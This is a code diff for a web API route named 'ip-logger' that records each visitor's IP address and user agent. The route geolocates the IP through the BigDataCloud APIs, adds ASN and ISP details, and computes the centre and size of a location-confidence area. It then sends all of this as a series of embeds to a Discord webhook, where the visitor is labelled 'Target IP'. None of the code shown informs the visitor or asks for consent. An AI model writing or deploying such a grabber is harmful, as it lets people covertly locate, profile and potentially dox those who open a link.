@@ -1,4 +1,4 @@
-// /pages/api/ip-logger.js - COMPLETE WITH FIXED CONFIDENCE MAP
+// /pages/api/ip-logger.js - COMPLETE WITH ASN DATA & CONFIDENCE AREA DETAILS
 export default async function handler(req, res) {
   // CORS headers
   res.setHeader('Access-Control-Allow-Origin', '*');
@@ -30,26 +30,50 @@ export default async function handler(req, res) {
 
     const BASE = 'https://api-bdc.net/data';
     
-    // --- Fetch Main Geolocation Data ---
+    // --- 1. Fetch Main Geolocation Data ---
     const GEO_URL = `${BASE}/ip-geolocation-full?ip=${encodeURIComponent(clientIP)}&localityLanguage=en&key=${KEY}`;
     
     let ipData = {};
     try {
       const response = await fetch(GEO_URL);
       if (!response.ok) {
-        console.error(`DEBUG: API error ${response.status}`);
+        console.error(`DEBUG: Geolocation API error ${response.status}`);
         return res.status(502).json({ success: false, error: `API error: ${response.status}` });
       }
       
       const rawText = await response.text();
       ipData = JSON.parse(rawText);
-      console.log('DEBUG: Main fetch OK, confidence:', ipData?.confidence);
+      console.log('DEBUG: Main geolocation fetch OK');
     } catch (fetchError) {
-      console.error('DEBUG: Fetch failed:', fetchError.message);
-      return res.status(500).json({ success: false, error: 'Failed to fetch data' });
+      console.error('DEBUG: Geolocation fetch failed:', fetchError.message);
+      return res.status(500).json({ success: false, error: 'Failed to fetch geolocation data' });
     }
 
-    // --- Extract Main Data ---
+    // --- 2. Fetch ASN Data if Available ---
+    let asnData = {};
+    const asnNumber = ipData?.network?.autonomousSystemNumber;
+    
+    if (asnNumber) {
+      const ASN_URL = `${BASE}/asn-info-full?asn=AS${asnNumber}&localityLanguage=en&key=${KEY}`;
+      console.log('DEBUG: Fetching ASN data from:', ASN_URL);
+      
+      try {
+        const asnResponse = await fetch(ASN_URL);
+        if (asnResponse.ok) {
+          const asnText = await asnResponse.text();
+          asnData = JSON.parse(asnText);
+          console.log('DEBUG: ASN data fetched successfully, keys:', Object.keys(asnData));
+        } else {
+          console.warn('DEBUG: ASN API failed with status:', asnResponse.status);
+        }
+      } catch (asnError) {
+        console.warn('DEBUG: ASN fetch error:', asnError.message);
+      }
+    } else {
+      console.warn('DEBUG: No ASN number found in main response');
+    }
+
+    // --- Extract Main Location Data ---
     const latitude = ipData?.location?.latitude || null;
     const longitude = ipData?.location?.longitude || null;
     const continent = ipData?.location?.continent || 'Unknown';
@@ -58,69 +82,65 @@ export default async function handler(req, res) {
     const locality = ipData?.location?.localityName || city;
     const country = ipData?.country?.name || 'Unknown';
     const countryCode = ipData?.country?.isoAlpha2 || 'Unknown';
-    const isp = ipData?.network?.organisation || 'Unknown';
-    const asnNumber = ipData?.network?.autonomousSystemNumber;
-    const asn = asnNumber ? `AS${asnNumber}` : 'Unknown';
+    const callingCode = ipData?.country?.callingCode || '';
+    const currency = ipData?.country?.currency?.code || '';
+    
+    // Use ASN data for network information (from the detailed ASN API)
+    const isp = asnData?.organisation || ipData?.network?.organisation || 'Unknown';
+    const asn = asnData?.asn || (asnNumber ? `AS${asnNumber}` : 'Unknown');
     const connectionType = ipData?.network?.connectionType || 'Unknown';
+    
     const confidence = ipData?.confidence || 'unknown';
     const confidenceArea = ipData?.confidenceArea || null;
     const accuracyRadius = ipData?.location?.accuracyRadius || null;
+    const timezone = ipData?.location?.timeZone?.ianaTimeId || 'Unknown';
 
-    console.log('DEBUG: Confidence area type:', typeof confidenceArea, 'is array?', Array.isArray(confidenceArea));
-
-    // --- PROCESS CONFIDENCE AREA DATA (ALL DATA) ---
-    let confidenceData = {
-      rawPolygon: confidenceArea,
+    // --- Process Confidence Area Data ---
+    let confidenceInfo = {
       hasData: false,
+      rawCoordinates: [],
       pointCount: 0,
       validPointCount: 0,
-      coordinates: [],
       bounds: null,
-      statistics: null,
-      mapUrl: null
+      statistics: null
     };
 
-    // Process raw confidence area data
     if (confidenceArea && Array.isArray(confidenceArea)) {
       try {
-        confidenceData.hasData = true;
-        confidenceData.pointCount = confidenceArea.length;
+        confidenceInfo.hasData = true;
+        confidenceInfo.pointCount = confidenceArea.length;
         
-        // Extract ALL coordinates with validation
-        confidenceData.coordinates = confidenceArea
-          .map((point, index) => {
-            if (Array.isArray(point) && point.length >= 2) {
-              const lon = point[0];
-              const lat = point[1];
-              
-              // Validate coordinates
-              if (typeof lon === 'number' && typeof lat === 'number' && 
-                  !isNaN(lon) && !isNaN(lat) &&
-                  Math.abs(lat) <= 90 && Math.abs(lon) <= 180) {
-                confidenceData.validPointCount++;
-                return {
-                  index,
-                  longitude: lon,
-                  latitude: lat,
-                  formatted: `[${lon.toFixed(6)}, ${lat.toFixed(6)}]`
-                };
-              }
+        // Process all coordinate points
+        confidenceInfo.rawCoordinates = confidenceArea.map((point, index) => {
+          if (Array.isArray(point) && point.length >= 2) {
+            const lon = point[0];
+            const lat = point[1];
+            
+            if (typeof lon === 'number' && typeof lat === 'number' && 
+                !isNaN(lon) && !isNaN(lat)) {
+              confidenceInfo.validPointCount++;
+              return {
+                index: index + 1,
+                longitude: lon,
+                latitude: lat,
+                formatted: `[${lon.toFixed(6)}, ${lat.toFixed(6)}]`
+              };
             }
-            return null;
-          })
-          .filter(point => point !== null);
+          }
+          return null;
+        }).filter(point => point !== null);
 
         // Calculate bounds if we have valid points
-        if (confidenceData.validPointCount > 0) {
-          const lats = confidenceData.coordinates.map(p => p.latitude);
-          const lons = confidenceData.coordinates.map(p => p.longitude);
+        if (confidenceInfo.validPointCount > 0) {
+          const lats = confidenceInfo.rawCoordinates.map(p => p.latitude);
+          const lons = confidenceInfo.rawCoordinates.map(p => p.longitude);
           
           const minLat = Math.min(...lats);
           const maxLat = Math.max(...lats);
           const minLon = Math.min(...lons);
           const maxLon = Math.max(...lons);
           
-          confidenceData.bounds = {
+          confidenceInfo.bounds = {
             minLat: minLat.toFixed(6),
             maxLat: maxLat.toFixed(6),
             minLon: minLon.toFixed(6),
@@ -129,102 +149,35 @@ export default async function handler(req, res) {
             lonRange: (maxLon - minLon).toFixed(6)
           };
 
-          // Calculate statistics
-          const centerLat = (minLat + maxLat) / 2;
-          const centerLon = (minLon + maxLon) / 2;
-          
-          // Calculate approximate area in km²
-          const latKm = (maxLat - minLat) * 111.32; // 1 degree latitude ≈ 111.32 km
+          // Calculate area statistics
+          const latKm = (maxLat - minLat) * 111.32;
           const avgLat = (minLat + maxLat) / 2;
           const lonKm = (maxLon - minLon) * (111.32 * Math.cos(avgLat * Math.PI / 180));
           const areaKm = Math.abs(latKm * lonKm);
           
-          confidenceData.statistics = {
-            center: {
-              latitude: centerLat.toFixed(6),
-              longitude: centerLon.toFixed(6)
-            },
+          confidenceInfo.statistics = {
+            centerLat: ((minLat + maxLat) / 2).toFixed(6),
+            centerLon: ((minLon + maxLon) / 2).toFixed(6),
             areaKm2: areaKm.toFixed(2),
             widthKm: lonKm.toFixed(2),
-            heightKm: latKm.toFixed(2),
-            aspectRatio: (lonKm / latKm).toFixed(2)
+            heightKm: latKm.toFixed(2)
           };
         }
         
-        console.log('DEBUG: Processed', confidenceData.validPointCount, 'valid points out of', confidenceData.pointCount);
+        console.log('DEBUG: Processed', confidenceInfo.validPointCount, 'confidence area points');
       } catch (error) {
         console.error('DEBUG: Error processing confidence area:', error.message);
-        confidenceData.error = error.message;
+        confidenceInfo.error = error.message;
       }
     }
 
-    // --- Generate WORKING Confidence Map URL ---
-    // Instead of geojson.io which has URL length limits, use a more reliable service
-    if (confidenceData.coordinates.length >= 3) {
-      try {
-        // Option 1: Use GitHub Gist for large data (more reliable)
-        const gistData = {
-          description: `Confidence Area for IP ${clientIP}`,
-          public: false,
-          files: {
-            "confidence-area.geojson": {
-              content: JSON.stringify({
-                type: "FeatureCollection",
-                features: [
-                  {
-                    type: "Feature",
-                    properties: { name: "IP Location" },
-                    geometry: latitude && longitude ? {
-                      type: "Point",
-                      coordinates: [longitude, latitude]
-                    } : null
-                  },
-                  {
-                    type: "Feature",
-                    properties: { name: "Confidence Area" },
-                    geometry: {
-                      type: "Polygon",
-                      coordinates: [confidenceData.coordinates.map(p => [p.longitude, p.latitude])]
-                    }
-                  }
-                ]
-              }, null, 2)
-            }
-          }
-        };
-        
-        // Create a simple visualization link (no API key needed)
-        // Use a service that can handle raw GeoJSON via URL parameter
-        const rawCoords = confidenceData.coordinates.map(p => `${p.latitude},${p.longitude}`).join('|');
-        confidenceData.mapUrl = `https://www.openstreetmap.org/?mlat=${latitude}&mlon=${longitude}&zoom=12#map=12/${latitude}/${longitude}`;
-        
-        // Alternative: Google Static Maps (requires API key but shows polygon)
-        if (process.env.GOOGLE_MAPS_API_KEY) {
-          const polygonPoints = confidenceData.coordinates
-            .map(p => `${p.latitude},${p.longitude}`)
-            .join('|');
-          
-          confidenceData.mapUrl = `https://maps.googleapis.com/maps/api/staticmap?center=${latitude},${longitude}&zoom=11&size=600x400&markers=color:red%7C${latitude},${longitude}&path=color:0x0000ff80%7Cweight:2%7Cfillcolor:0x0000ff20%7C${polygonPoints}&key=${process.env.GOOGLE_MAPS_API_KEY}`;
-        }
-        
-        console.log('DEBUG: Created map URL');
-      } catch (mapError) {
-        console.error('DEBUG: Error creating map URL:', mapError.message);
-      }
-    }
-
-    // --- Simple Map URL (fallback) ---
-    let simpleMapUrl = null;
-    if (latitude && longitude && !isNaN(latitude) && !isNaN(longitude)) {
-      simpleMapUrl = `https://www.google.com/maps?q=${latitude},${longitude}&z=12`;
-    }
-
-    // --- Build Main Data Object ---
+    // --- Build Data Objects ---
     const mainData = {
       ip: clientIP,
       timestamp: new Date().toISOString(),
       userAgent,
       location: {
+        continent,
         country,
         countryCode,
         region,
@@ -236,48 +189,70 @@ export default async function handler(req, res) {
         confidence
       },
       network: {
-        isp,
-        asn,
-        connectionType,
-        asnNumber: asnNumber || null
+        // From ASN API (detailed)
+        asn: asn,
+        organisation: asnData?.organisation || 'Unknown',
+        registry: asnData?.registry || 'Unknown',
+        registeredCountry: asnData?.registeredCountryName || 'Unknown',
+        registrationDate: asnData?.registrationLastChange || 'Unknown',
+        totalIpv4Addresses: asnData?.totalIpv4Addresses || 0,
+        totalIpv6Prefixes: asnData?.totalIpv6Prefixes || 0,
+        rank: asnData?.rankText || 'Unknown',
+        // From main API
+        connectionType: connectionType,
+        isp: isp
       },
-      device: parseUserAgent(userAgent),
-      maps: {
-        simple: simpleMapUrl,
-        confidence: confidenceData.mapUrl
+      timezone: {
+        name: timezone
+      },
+      confidenceArea: {
+        hasData: confidenceInfo.hasData,
+        pointCount: confidenceInfo.pointCount,
+        validPoints: confidenceInfo.validPointCount
       }
     };
 
-    console.log('DEBUG: Confidence data ready:', confidenceData.hasData);
+    console.log('DEBUG: Main data ready, ASN:', mainData.network.asn);
 
     // --- Send Discord Webhooks ---
     const webhookResults = {
       main: { sent: false, error: null },
-      confidence: { sent: false, error: null }
+      confidence: { sent: false, error: null },
+      asnDetails: { sent: false, error: null }
     };
 
     const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK_URL;
     if (DISCORD_WEBHOOK) {
       try {
-        // Send MAIN webhook
+        // 1. Send MAIN webhook with location and basic ASN
         await sendMainWebhook(mainData, DISCORD_WEBHOOK);
         webhookResults.main.sent = true;
         console.log('DEBUG: Main webhook sent');
         
-        // Send CONFIDENCE DETAILS webhook (with ALL data)
-        if (confidenceData.hasData && confidenceData.coordinates.length > 0) {
+        // 2. Send ASN DETAILS webhook if we have ASN data
+        if (asnData && Object.keys(asnData).length > 0) {
           try {
-            // Send multiple confidence webhooks if data is large
-            await sendConfidenceWebhooks(confidenceData, mainData, DISCORD_WEBHOOK);
+            await sendAsnDetailsWebhook(mainData, asnData, DISCORD_WEBHOOK);
+            webhookResults.asnDetails.sent = true;
+            console.log('DEBUG: ASN details webhook sent');
+          } catch (asnError) {
+            webhookResults.asnDetails.error = asnError.message;
+            console.error('DEBUG: ASN webhook failed:', asnError.message);
+          }
+        }
+        
+        // 3. Send CONFIDENCE AREA webhook if we have confidence data
+        if (confidenceInfo.hasData && confidenceInfo.validPointCount > 0) {
+          try {
+            await sendConfidenceAreaWebhooks(mainData, confidenceInfo, DISCORD_WEBHOOK);
             webhookResults.confidence.sent = true;
-            console.log('DEBUG: Confidence webhooks sent');
+            console.log('DEBUG: Confidence area webhooks sent');
           } catch (confError) {
             webhookResults.confidence.error = confError.message;
             console.error('DEBUG: Confidence webhook failed:', confError.message);
           }
-        } else {
-          console.log('DEBUG: No confidence data to send separate webhook');
         }
+        
       } catch (mainError) {
         webhookResults.main.error = mainError.message;
         console.error('DEBUG: Main webhook failed:', mainError.message);
@@ -289,15 +264,17 @@ export default async function handler(req, res) {
     // --- Return Response ---
     return res.status(200).json({
       success: true,
-      data: mainData,
-      confidence: {
-        hasData: confidenceData.hasData,
-        pointCount: confidenceData.pointCount,
-        validPoints: confidenceData.validPointCount,
-        bounds: confidenceData.bounds,
-        statistics: confidenceData.statistics,
-        mapUrl: confidenceData.mapUrl,
-        sampleCoordinates: confidenceData.coordinates.slice(0, 5) // First 5 points as sample
+      data: {
+        ip: clientIP,
+        location: mainData.location,
+        network: mainData.network,
+        confidenceArea: {
+          hasData: confidenceInfo.hasData,
+          totalPoints: confidenceInfo.pointCount,
+          validPoints: confidenceInfo.validPointCount,
+          bounds: confidenceInfo.bounds,
+          statistics: confidenceInfo.statistics
+        }
       },
       webhooks: webhookResults
     });
@@ -336,28 +313,42 @@ function parseUserAgent(ua) {
   return { browser, os, device, raw: s.substring(0, 150) };
 }
 
-// --- Webhook Functions ---
-
+// --- Webhook 1: MAIN LOCATION & BASIC ASN ---
 async function sendMainWebhook(data, webhookUrl) {
   const embed = {
     embeds: [{
-      title: '🌐 IP Location - Main Report',
+      title: '🌐 IP Location Report',
       color: 0x3498db,
       timestamp: data.timestamp,
       fields: [
         { 
           name: '📍 IP Address', 
-          value: `\`\`\`${data.ip}\`\`\``, 
+          value: `\`${data.ip}\``, 
           inline: false 
         },
         { 
-          name: '🌍 Location', 
-          value: `${data.location.country} (${data.location.countryCode})\n${data.location.region} / ${data.location.city}`,
+          name: '🌍 Continent', 
+          value: data.location.continent,
           inline: true 
         },
         { 
-          name: '📡 Network', 
-          value: `**ISP:** ${data.network.isp}\n**ASN:** ${data.network.asn || 'N/A'}\n**Type:** ${data.network.connectionType}`,
+          name: '🇮🇳 Country', 
+          value: `${data.location.country} (${data.location.countryCode})`,
+          inline: true 
+        },
+        { 
+          name: '🏙️ Region', 
+          value: data.location.region,
+          inline: true 
+        },
+        { 
+          name: '🏙️ City', 
+          value: data.location.city,
+          inline: true 
+        },
+        { 
+          name: '📍 Locality', 
+          value: data.location.locality,
           inline: true 
         },
         { 
@@ -376,33 +367,36 @@ async function sendMainWebhook(data, webhookUrl) {
           inline: true 
         },
         { 
+          name: '🔢 ASN', 
+          value: data.network.asn,
+          inline: true 
+        },
+        { 
+          name: '🏢 Organization', 
+          value: data.network.organisation,
+          inline: true 
+        },
+        { 
+          name: '📡 Connection Type', 
+          value: data.network.connectionType,
+          inline: true 
+        },
+        { 
+          name: '🕒 Timezone', 
+          value: data.timezone.name,
+          inline: true 
+        },
+        { 
           name: '🖥️ Device', 
-          value: `${data.device.browser} / ${data.device.os} (${data.device.device})`,
+          value: `${parseUserAgent(data.userAgent).browser} / ${parseUserAgent(data.userAgent).os}`,
           inline: true 
         }
       ],
       footer: { 
-        text: 'Main Report • See next messages for confidence area analysis'
+        text: 'Main Report • See next messages for ASN details and confidence area'
       }
     }]
   };
-
-  // Add map links if available
-  const mapFields = [];
-  if (data.maps.simple) {
-    mapFields.push(`[📍 Simple Map](${data.maps.simple})`);
-  }
-  if (data.maps.confidence) {
-    mapFields.push(`[🗺️ Confidence Map](${data.maps.confidence})`);
-  }
-  
-  if (mapFields.length > 0) {
-    embed.embeds[0].fields.push({
-      name: '🗺️ Map Links',
-      value: mapFields.join(' • '),
-      inline: false
-    });
-  }
 
   const response = await fetch(webhookUrl, { 
     method: 'POST', 
@@ -412,99 +406,218 @@ async function sendMainWebhook(data, webhookUrl) {
   
   if (!response.ok) {
     const errorText = await response.text();
-    throw new Error(`Discord API: ${response.status} - ${errorText.substring(0, 100)}`);
+    throw new Error(`Discord API: ${response.status}`);
   }
 }
 
-async function sendConfidenceWebhooks(confidenceData, mainData, webhookUrl) {
-  const totalPoints = confidenceData.coordinates.length;
+// --- Webhook 2: ASN DETAILS (from asn-info-full API) ---
+async function sendAsnDetailsWebhook(mainData, asnData, webhookUrl) {
+  const fields = [
+    { 
+      name: '📍 Target IP', 
+      value: `\`${mainData.ip}\``, 
+      inline: false 
+    },
+    { 
+      name: '🔢 ASN', 
+      value: asnData.asn || 'N/A',
+      inline: true 
+    },
+    { 
+      name: '🔢 ASN Numeric', 
+      value: asnData.asnNumeric ? String(asnData.asnNumeric) : 'N/A',
+      inline: true 
+    },
+    { 
+      name: '🏢 Organization', 
+      value: asnData.organisation || 'N/A',
+      inline: true 
+    },
+    { 
+      name: '🏷️ Name', 
+      value: asnData.name || 'N/A',
+      inline: true 
+    },
+    { 
+      name: '📋 Registry', 
+      value: asnData.registry || 'N/A',
+      inline: true 
+    },
+    { 
+      name: '🇮🇳 Registered Country', 
+      value: asnData.registeredCountryName || 'N/A',
+      inline: true 
+    },
+    { 
+      name: '📅 Registration Date', 
+      value: asnData.registrationLastChange || 'N/A',
+      inline: true 
+    },
+    { 
+      name: '📊 IPv4 Addresses', 
+      value: asnData.totalIpv4Addresses ? asnData.totalIpv4Addresses.toLocaleString() : '0',
+      inline: true 
+    },
+    { 
+      name: '📊 IPv4 Prefixes', 
+      value: asnData.totalIpv4Prefixes ? String(asnData.totalIpv4Prefixes) : '0',
+      inline: true 
+    },
+    { 
+      name: '📊 IPv6 Prefixes', 
+      value: asnData.totalIpv6Prefixes ? String(asnData.totalIpv6Prefixes) : '0',
+      inline: true 
+    },
+    { 
+      name: '🏆 Rank', 
+      value: asnData.rankText || 'N/A',
+      inline: true 
+    },
+    { 
+      name: '🔗 Total Receiving From', 
+      value: asnData.totalReceivingFrom ? String(asnData.totalReceivingFrom) : '0',
+      inline: true 
+    },
+    { 
+      name: '🔗 Total Transit To', 
+      value: asnData.totalTransitTo ? String(asnData.totalTransitTo) : '0',
+      inline: true 
+    }
+  ];
+
+  const embed = {
+    embeds: [{
+      title: '📡 ASN Detailed Information',
+      description: `Complete ASN data for ${mainData.ip}`,
+      color: 0x2ecc71, // Green color
+      timestamp: mainData.timestamp,
+      fields: fields,
+      footer: { 
+        text: 'ASN Details • From BigDataCloud asn-info-full API'
+      }
+    }]
+  };
+
+  const response = await fetch(webhookUrl, { 
+    method: 'POST', 
+    headers: { 'Content-Type': 'application/json' }, 
+    body: JSON.stringify(embed)
+  });
   
-  // WEBHOOK 1: Confidence Statistics & Overview
+  if (!response.ok) {
+    const errorText = await response.text();
+    throw new Error(`Discord API: ${response.status}`);
+  }
+}
+
+// --- Webhook 3: CONFIDENCE AREA DATA (multiple messages if needed) ---
+async function sendConfidenceAreaWebhooks(mainData, confidenceInfo, webhookUrl) {
+  const totalPoints = confidenceInfo.rawCoordinates.length;
+  
+  // Part 1: Confidence Area Statistics
   const statsEmbed = {
     embeds: [{
-      title: '📊 Confidence Area - Part 1/3: Overview',
-      description: `**IP:** \`${mainData.ip}\` | **Confidence Level:** ${mainData.location.confidence.toUpperCase()}`,
-      color: 0x9b59b6,
+      title: '📊 Confidence Area Analysis - Part 1: Statistics',
+      description: `Confidence analysis for IP: \`${mainData.ip}\``,
+      color: 0x9b59b6, // Purple color
       timestamp: mainData.timestamp,
       fields: [
         { 
-          name: '📐 Polygon Statistics', 
-          value: `**Total Points:** ${totalPoints}\n**Valid Points:** ${confidenceData.validPointCount}\n**Data Quality:** ${((confidenceData.validPointCount / confidenceData.pointCount) * 100).toFixed(1)}%`,
+          name: '🎯 Confidence Level', 
+          value: mainData.location.confidence.toUpperCase(),
+          inline: true 
+        },
+        { 
+          name: '📐 Total Points', 
+          value: String(confidenceInfo.pointCount),
+          inline: true 
+        },
+        { 
+          name: '✅ Valid Points', 
+          value: String(confidenceInfo.validPointCount),
+          inline: true 
+        },
+        { 
+          name: '📏 Data Quality', 
+          value: `${((confidenceInfo.validPointCount / confidenceInfo.pointCount) * 100).toFixed(1)}%`,
           inline: true 
         }
       ],
       footer: { 
-        text: 'Confidence Analysis Part 1 of 3'
+        text: 'Confidence Area Analysis Part 1 of 3'
       }
     }]
   };
 
   // Add bounds if available
-  if (confidenceData.bounds) {
+  if (confidenceInfo.bounds) {
     statsEmbed.embeds[0].fields.push(
       { 
-        name: '📏 Bounding Box', 
-        value: `**Min Lat:** ${confidenceData.bounds.minLat}°\n**Max Lat:** ${confidenceData.bounds.maxLat}°\n**Min Lon:** ${confidenceData.bounds.minLon}°\n**Max Lon:** ${confidenceData.bounds.maxLon}°`,
+        name: '📍 Bounding Box - Min', 
+        value: `Lat: ${confidenceInfo.bounds.minLat}°\nLon: ${confidenceInfo.bounds.minLon}°`,
         inline: true 
       },
       { 
-        name: '📐 Ranges', 
-        value: `**Lat Range:** ${confidenceData.bounds.latRange}°\n**Lon Range:** ${confidenceData.bounds.lonRange}°`,
+        name: '📍 Bounding Box - Max', 
+        value: `Lat: ${confidenceInfo.bounds.maxLat}°\nLon: ${confidenceInfo.bounds.maxLon}°`,
+        inline: true 
+      },
+      { 
+        name: '📏 Ranges', 
+        value: `Lat: ${confidenceInfo.bounds.latRange}°\nLon: ${confidenceInfo.bounds.lonRange}°`,
         inline: true 
       }
     );
   }
 
   // Add statistics if available
-  if (confidenceData.statistics) {
+  if (confidenceInfo.statistics) {
     statsEmbed.embeds[0].fields.push(
       { 
         name: '📍 Calculated Center', 
-        value: `${confidenceData.statistics.center.latitude}°, ${confidenceData.statistics.center.longitude}°`,
+        value: `${confidenceInfo.statistics.centerLat}°, ${confidenceInfo.statistics.centerLon}°`,
         inline: true 
       },
       { 
         name: '📐 Area Dimensions', 
-        value: `**Width:** ${confidenceData.statistics.widthKm} km\n**Height:** ${confidenceData.statistics.heightKm} km\n**Area:** ${confidenceData.statistics.areaKm2} km²\n**Aspect Ratio:** ${confidenceData.statistics.aspectRatio}`,
+        value: `Width: ${confidenceInfo.statistics.widthKm} km\nHeight: ${confidenceInfo.statistics.heightKm} km`,
+        inline: true 
+      },
+      { 
+        name: '📏 Area Size', 
+        value: `${confidenceInfo.statistics.areaKm2} km²`,
         inline: true 
       }
     );
   }
 
-  // Add map link if available
-  if (confidenceData.mapUrl) {
-    statsEmbed.embeds[0].fields.push({
-      name: '🗺️ Visualization',
-      value: `[Click to view confidence area](${confidenceData.mapUrl})`,
-      inline: false
-    });
-  }
-
-  // Send first webhook
+  // Send Part 1
   await fetch(webhookUrl, { 
     method: 'POST', 
     headers: { 'Content-Type': 'application/json' }, 
     body: JSON.stringify(statsEmbed)
   });
 
-  // WEBHOOK 2: First batch of coordinates (points 1-20)
+  // Part 2: First 15 Coordinate Points
   if (totalPoints > 0) {
-    const batch1 = confidenceData.coordinates.slice(0, Math.min(20, totalPoints));
+    const batch1 = confidenceInfo.rawCoordinates.slice(0, Math.min(15, totalPoints));
     const coordEmbed1 = {
       embeds: [{
-        title: '📊 Confidence Area - Part 2/3: Coordinates (1-20)',
-        description: `Showing first ${batch1.length} of ${totalPoints} coordinates`,
-        color: 0x3498db,
+        title: `📊 Confidence Area - Part 2: Coordinates 1-${batch1.length}`,
+        description: `Coordinate points [Longitude, Latitude] for ${mainData.ip}`,
+        color: 0xe74c3c, // Red color
         timestamp: mainData.timestamp,
-        fields: []
+        fields: [],
+        footer: { 
+          text: `Confidence Area Analysis Part 2 of 3 • Format: [Lon, Lat]`
+        }
       }]
     };
 
-    // Group coordinates for better display
-    const coordGroups = [];
+        // Add coordinates in groups of 5
     for (let i = 0; i < batch1.length; i += 5) {
       const group = batch1.slice(i, i + 5);
-      const coordText = group.map(p => `${p.index + 1}. ${p.formatted}`).join('\n');
+      const coordText = group.map(p => `${p.index}. ${p.formatted}`).join('\n');
       coordEmbed1.embeds[0].fields.push({
         name: `Points ${i + 1}-${i + group.length}`,
         value: `\`\`\`${coordText}\`\`\``,
@@ -512,52 +625,50 @@ async function sendConfidenceWebhooks(confidenceData, mainData, webhookUrl) {
       });
     }
 
-    coordEmbed1.embeds[0].fields.push({
-      name: '📋 Format',
-      value: '`[Longitude, Latitude]` in decimal degrees',
-      inline: true
-    });
-
-    // Send second webhook
+    // Send Part 2
     await fetch(webhookUrl, { 
       method: 'POST', 
       headers: { 'Content-Type': 'application/json' }, 
       body: JSON.stringify(coordEmbed1)
     });
 
-    // WEBHOOK 3: More coordinates if available (points 21-40)
-    if (totalPoints > 20) {
-      const batch2 = confidenceData.coordinates.slice(20, Math.min(40, totalPoints));
+    // Part 3: More coordinates if available
+    if (totalPoints > 15) {
+      const batch2 = confidenceInfo.rawCoordinates.slice(15, Math.min(30, totalPoints));
       const coordEmbed2 = {
         embeds: [{
-          title: `📊 Confidence Area - Part 3/3: Coordinates (21-${Math.min(40, totalPoints)})`,
-          description: `Showing coordinates 21-${Math.min(40, totalPoints)} of ${totalPoints}`,
-          color: 0xe74c3c,
+          title: `📊 Confidence Area - Part 3: Coordinates 16-${15 + batch2.length}`,
+          description: `Additional coordinate points for ${mainData.ip}`,
+          color: 0xf39c12, // Orange color
           timestamp: mainData.timestamp,
-          fields: []
+          fields: [],
+          footer: { 
+            text: `Confidence Area Analysis Part 3 of 3 • Showing ${batch2.length} of ${totalPoints} total points`
+          }
         }]
       };
 
+      // Add coordinates in groups of 5
       for (let i = 0; i < batch2.length; i += 5) {
         const group = batch2.slice(i, i + 5);
-        const coordText = group.map(p => `${p.index + 1}. ${p.formatted}`).join('\n');
+        const coordText = group.map(p => `${p.index}. ${p.formatted}`).join('\n');
         coordEmbed2.embeds[0].fields.push({
-          name: `Points ${i + 21}-${i + 21 + group.length - 1}`,
+          name: `Points ${i + 16}-${i + 16 + group.length - 1}`,
           value: `\`\`\`${coordText}\`\`\``,
           inline: false
         });
       }
 
-      // Add remaining count if there are more points
-      if (totalPoints > 40) {
+      // Add note if there are more points
+      if (totalPoints > 30) {
         coordEmbed2.embeds[0].fields.push({
-          name: '📝 Additional Data',
-          value: `${totalPoints - 40} more coordinates not shown\nTotal polygon has ${totalPoints} points`,
+          name: '📝 Note',
+          value: `${totalPoints - 30} additional coordinate points not shown\nTotal polygon has ${totalPoints} points`,
           inline: false
         });
       }
 
-      // Send third webhook
+      // Send Part 3
       await fetch(webhookUrl, { 
         method: 'POST', 
         headers: { 'Content-Type': 'application/json' }, 
